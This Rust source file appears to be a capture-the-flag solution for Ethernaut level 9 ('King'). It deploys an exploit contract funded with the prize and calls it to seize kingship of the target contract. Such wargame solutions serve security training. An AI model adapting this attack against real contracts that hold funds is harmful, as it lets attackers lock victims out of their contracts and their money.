use crate::abi::king_exploit::KingExploit;
use async_trait::async_trait;
use ctf::ethernaut::lvl09_king::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let king = King::new(target.address, offender.to_owned());
        let exploit = KingExploit::deploy(offender.to_owned(), king.address())?
            .value(king.prize().await?)
            .send()
            .await?;

        exploit.become_king().send().await?.await?;

        Ok(())
    }
}
